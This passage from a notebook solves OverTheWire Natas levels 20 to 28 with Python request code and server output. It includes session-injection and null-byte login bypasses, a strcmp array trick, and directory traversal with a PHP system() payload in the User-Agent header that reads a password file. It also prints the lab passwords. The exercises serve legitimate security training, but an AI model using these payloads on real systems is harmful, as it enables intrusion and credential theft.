     "output_type": "stream",
     "text": [
      "1361\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password not found.\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "1527\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Reading from /var/lib/php/sessions/mysess_key<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21\n",
      "Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";admin|s:1:\"1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: admin => 1<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password found: fBPhv63cKE1lkQl04cE5CuFTzXe15NfiH\n"
     ]
    }
   ],
   "source": [
    "#natas20\n",
    "count = 20\n",
    "init()\n",
    "\n",
    "while 'natas21' not in pwd:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/index.php?debug=1'\n",
    "    cookies = dict(PHPSESSID='key')\n",
    "    params = dict(name='admin\\nadmin 1')\n",
    "    result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies, params=params)\n",
    "    print(len(result.text))\n",
    "    print(result.text)\n",
    "    if find_pwd(result):\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas21"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas21\n",
    "count = 21\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}-experimenter.natas.labs.overthewire.org/index.php?submit=1&admin=1&bgcolor=blue&debug=1'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = dict(PHPSESSID=res.cookies.get('PHPSESSID'))\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas22"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fdIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas22\n",
    "count = 22\n",
    "init()\n",
    "\n",
    "cookies = dict(PHPSESSID='1')\n",
    "params = dict(revelio=1)\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies, params=params, allow_redirects=False)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas23"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fMeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas23\n",
    "count = 23\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/?passwd=11iloveyou'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas24"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas24\", \"pass\": \"MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\" };</script></head>\n",
      "<body>\n",
      "<h1>natas24</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Password:\n",
      "<form name=\"input\" method=\"get\">\n",
      "    <input type=\"text\" name=\"passwd\" size=20>\n",
      "    <input type=\"submit\" value=\"Login\">\n",
      "</form>\n",
      "\n",
      "<br />\n",
      "<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />\n",
      "<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>  \n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas24\n",
    "count = 24\n",
    "init()\n",
    "\n",
    "passwd = ''\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org?passwd[]={passwd}'\n",
    "result = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(result.text)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas25"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas25\", \"pass\": \"ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws\" };</script></head>\n",
      "<body>\n",
      "\n",
      "<h1>natas25</h1>\n",
      "<div id=\"content\">\n",
      "<div align=\"right\">\n",
      "<form>\n",
      "<select name='lang' onchange='this.form.submit()'>\n",
      "<option>language</option>\n",
      "<option>de</option><option>en</option></select>\n",
      "</form>\n",
      "</div>\n",
      "\n",
      "[17.08.2024 13::59:46] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\n",
      " \"Directory traversal attempt! fixing request.\"\n",
      "<br />\n",
      "<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />\n",
      "<h2></h2><br />\n",
      "<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />\n",
      "<p align=\"justify\"><br />\n",
      "<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />\n",
      "<div align=\"right\"><h6></h6><div><p>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fcVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas25\n",
    "count = 25\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=auth)\n",
    "cookies = res.cookies.get_dict()\n",
    "\n",
    "lang = f'....//....//....//....//....//var/www/natas/natas25/logs/natas25_{cookies[\"PHPSESSID\"]}.log'\n",
    "\n",
    "params = dict(lang=lang)\n",
    "header = {'User-Agent': '<?php system(\"cat /etc/natas_webpass/natas26\"); ?>'}\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), params=params, headers=header, cookies=cookies)\n",
    "print(result.text)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas26"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas26\", \"pass\": \"cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\" };</script></head>\n",
      "<body>\n",
      "\n",
      "<h1>natas26</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Draw a line:<br>\n",
      "<form name=\"input\" method=\"get\">\n",
      "X1<input type=\"text\" name=\"x1\" size=2>\n",
      "Y1<input type=\"text\" name=\"y1\" size=2>\n",
      "X2<input type=\"text\" name=\"x2\" size=2>\n",
      "Y2<input type=\"text\" name=\"y2\" size=2>\n",
      "<input type=\"submit\" value=\"DRAW!\">\n",
      "</form>\n",
      "\n",
      "\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#natas26\n",
    "count = 26\n",
    "init()\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "\n",
    "res = requests.get(url, auth=auth)\n",
    "print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas27"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password not found.\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas27\", \"pass\": \"u3RRffXjysjgwFU6b9xa23i6prmUsYne\" };</script></head>\n",
      "<body>\n",
      "<h1>natas27</h1>\n",
      "<div id=\"content\">\n",
      "Wrong password for user: natas28<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "password = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'\n",
    "\n",
    "#natas27\n",
    "count = 27\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "auth = (natas, password)\n",
    "\n",
    "# First request add a user, username is natas28 and password is empty\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "username = 'natas' + '\\00' * 57 + '28' + '1' # natas28\n",
    "password = ''\n",
    "params = dict(username=username, password=password)\n",
    "result = requests.get(url, auth=auth, params=params)\n",
    "\n",
    "# Second request get user with username is natas28 and password is empty\n",
    "username = 'natas28'\n",
    "password = ''\n",
    "params = dict(username=username, password=password)\n",
    "result = requests.get(url, auth=auth, params=params)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas28"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIZVmxvtq+NhSBxG1ShKyNOvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "0: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x19Vlo\\xb6\\xaf\\x8d\\x85 q\\x1bT\\xa1+#N\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "1: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLP9baIk2Ue8NLFHkisvCsovfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "1: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xcf\\xf5\\xb6\\x88\\x93e\\x1e\\xf0\\xd2\\xc5\\x1eH\\xac\\xbc+(\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "2: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJKsqxhd1u8TdA/TD8pKcZ3vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "2: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2J\\xb2\\xacaw[\\xbcM\\xd0?L?))\\xc6w\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "3: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLwHgMX39QP8kCLRhrAhHsBvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "3: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xf0\\x1e\\x03\\x17\\xdf\\xd4\\x0f\\xf2@\\x8bF\\x1a\\xc0\\x84{\\x01\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "4: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI2SFJ4JZwg7F7H4qlqMwOgvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "4: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf26HRx%\\x9c \\xec^\\xc7\\xe2\\xa9j3\\x03\\xa0\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "5: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKW1EAm2zGwJ7pnF00ZgCnqvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "5: b\"\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x96\\xd4@&\\xdb1\\xb0'\\xbag\\x17M\\x19\\x80)\\xea\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p\"\n",
      "6: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLZtG95Lw/313R91sgo7SCrvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "6: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xd9\\xb4oy/\\x0f\\xf7\\xd7t}\\xd6\\xc8(\\xed \\xab\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "7: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIAQZdqP7udINLSn87zg+EtvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "7: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x00A\\x97j?\\xbb\\x9d \\xd2\\xd2\\x9f\\xce\\xf3\\x83\\xe1-\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "8: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIA/OFYvTXi3nVb7hK9Tz9AvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "8: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x00\\xfc\\xe1X\\xbd5\\xe2\\xdeu[\\xee\\x12\\xbdO?@\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "9: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxoOPz2tfTpR263GrPIWalvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "9: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xb1\\xa0\\xe3\\xf3\\xda\\xd7\\xd3\\xa5\\x1d\\xba\\xdcj\\xcf!f\\xa5\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      ":: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIPGD2qn76aAR3W73EwLCE4vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      ":: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x0f\\x18=\\xaa\\x9f\\xbe\\x9a\\x01\\x1d\\xd6\\xefq0,!8\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      ";: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIAOqJXG1DZ48I4VtxumPUNvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      ";: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x00:\\xa2W\\x1bP\\xd9\\xe3\\xc28V\\xdcn\\x98\\xf5\\r\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "<: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ4IYofcA3Q0gDnuZf2bCOivfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "<: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2x!\\x8a\\x1fp\\r\\xd0\\xd2\\x00\\xe7\\xb9\\x97\\xf6l#\\xa2\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "=: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIYlGaiL23ibX9G2tO0FomovfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "=: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x18\\x94f\\xa2/m\\xe2m\\x7fF\\xda\\xd3\\xb4\\x16\\x89\\xa8\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      ">: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIzofgKs0E9fU9MzN9If260vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      ">: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf23\\xa1\\xf8\\n\\xb3A=}OL\\xcc\\xdfH\\x7fn\\xb4\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
